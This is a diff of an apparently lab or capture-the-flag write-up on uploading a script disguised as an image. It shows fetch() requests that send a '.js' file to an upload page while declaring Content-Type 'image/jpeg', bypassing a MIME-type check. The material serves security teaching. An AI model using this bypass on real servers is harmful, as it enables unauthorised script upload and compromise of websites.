@@ -1,7 +1,7 @@
 # Uploading a script as an image
 
 
-On the page `http://<IP>/?page=upload` (the **Add image** button), you can upload a script and make it look like an image.  
+On the page `http://IP/?page=upload` (the **Add image** button), you can upload a script and make it look like an image.  
 How can this be done?
 
 
@@ -12,12 +12,12 @@ We try to upload images in different formats. We find that the page accepts JPEG
 
 
 ```bash
-fetch("http://<IP>/?page=upload", {
+fetch("http://IP/?page=upload", {
   "headers": {
     "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryJvC1a8Zej7QK5Ogp",
     "upgrade-insecure-requests": "1"
   },
-  "referrer": "http://<IP>/?page=upload",
+  "referrer": "http://IP/?page=upload",
   "body": "------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"<filename>.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp--\r\n",
   "method": "POST",
   "mode": "cors",
@@ -57,12 +57,12 @@ We try to send the same request through the console, keep `Content-Type: image/j
 
 
 ```bash
-const res = await fetch("http://<IP>/?page=upload", {
+const res = await fetch("http://IP/?page=upload", {
   "headers": {
     "content-type": "multipart/form-data; boundary=----WebKitFormBoundarygsnTcSeS3o1TbyAG",
     "upgrade-insecure-requests": "1"
   },
-  "referrer": "http://<IP>/?page=upload",
+  "referrer": "http://IP/?page=upload",
   "body": "------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"<filename>.js\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG--\r\n",
   "method": "POST",
   "mode": "cors",
